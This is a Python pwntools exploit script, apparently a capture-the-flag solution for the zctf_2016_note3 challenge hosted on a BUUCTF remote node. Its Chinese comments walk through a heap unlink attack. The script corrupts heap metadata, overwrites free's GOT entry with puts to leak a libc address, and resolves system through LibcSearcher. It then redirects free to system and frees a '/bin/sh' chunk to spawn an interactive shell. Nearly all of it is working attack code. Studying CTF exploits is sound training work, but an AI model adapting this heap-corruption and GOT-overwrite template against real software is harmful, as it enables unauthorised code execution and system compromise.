from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + next(libc.search(b'/bin/sh'))

	return (system, binsh)


s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='i386', log_level='debug')
binary = './zctf_2016_note3'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',27811) if argv[1]=='r' else process(binary)
# p = remote('node4.buuoj.cn',29924) if argv[1]=='r' else process(binary,
#             env={"LD_PRELOAD":"/home/javayuan/pwn_libc合集/Ubuntu16_32/libc-2.23_32.so"})
#替换libc和ld
# p = process(["/path/to/ld.so", binary],
#             env={"LD_PRELOAD":"/path/to/libc.so.6"})
libc = ELF('/home/javayuan/pwn_libc合集/Ubuntu18_64/libc-2.27.so')
# patchelf --set-interpreter /lib64/32_3-linux.so.2 ./pwn
# patchelf --replace-needed libc.so.6 /home/javayuan/pwn_libc合集/Ubuntu16_64/libc-2.23.so ./pwn  #libc.so.6为需要替换的libc路径 第二个参数是需要加载的glibc的目录    pwn 是二进制文件
# patchelf --set-interpreter /lib64/2_27-linux.so.2 ./pwn
# patchelf --replace-needed libc.so.6 /home/javayuan/pwn_libc合集/Ubuntu18_64/libc-2.27.so ./pwn  #libc.so.6为需要替换的libc路径 第二个参数是需要加载的glibc的目录    pwn 是二进制文件

def bytes2int(content):
	return str(content,encoding='utf-8')

def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def dbg():
	gdb.attach(p)
	pause()
# start
def add(len,content=b'a'):
    sla(b'>',b'1')
    sla(b'(less than 1024)',int2bytes(len))
    sla(b'content:',content)

def edit(index, content):
    sla(b'>',b'3')
    sla(b'note:',int2bytes(index))
    sla(b'content:',content)


def delete(index):
    sla(b'>',b'4')
    sla(b'note:',int2bytes(index))


#unlink
ptr = 0x06020C8

fd = ptr - 0x18 + 0x8  #注意这里的ptr需要根据释放chunk的存储位置而修改
bk = ptr - 0x10 + 0x8  #正常unlink就是释放chunk1所以不用改，但本地是释放chunk2
puts_got = elf.got['puts']
free_got = elf.got['free']
atoi_got = elf.got['atoi']
puts_plt = elf.plt['puts']

add(0) #0
add(0x30) # 1 用于伪造fake chunk
add(0x80) # 2 用于和fake chunk合并
add(0x30) # 3 未修改chunk 用于保存 /bin/sh参数

payload = p64(0)*2 + p64(0) + p64(0x41)
payload += p64(0) + p64(0x30) #fake chunk 大小为0x20
payload += p64(fd) + p64(bk)
payload += b'a'*0x10
payload += p64(0x30) + p64(0x90)
edit(0, payload)
delete(2)
#unlink 实现ptr = ptr - 0x18
# dbg()
payload = b'a'*0x10 + p64(free_got) + p64(puts_got)
#因为ptr的位置为1号块的地址，所以先用free_got表地址覆盖1号块地址，再用puts_got表覆盖2号块地址
#这里覆盖一号块好理解，因为等下要把free_got覆盖为puts_plt，但是覆盖二号块我一开始没理解
#现在理解了，覆盖二号块是为了给free函数传参，等会free(2)中的2就是2号块的地址，这里就换成puts_got实现leek
edit(1, payload)
# dbg()

# 关键点——因为会检测到\n替换为0覆盖下一位，
# 所以不能直接使用p64(puts_plt)作为payload，要加上[:-1]，为\n留上一个位置
payload = p64(puts_plt)[:-1]
#把free_got（原本存放的1号块地址）指向的地址换成puts_plt
edit(0, payload)
# dbg()

delete(1)

puts_addr = uu64(ru('\x7f',drop=False)[-6:])
log.success('puts_addr: ',hex(puts_addr))
system_addr, bin_sh_addr = ret2libc(puts_addr,'puts')

payload = p64(system_addr)[:-1]
#把free_got（原本存放的1号块地址）指向的地址换成system_addr
edit(0, payload)
edit(3, b'/bin/sh\x00')
delete(3)

itr()
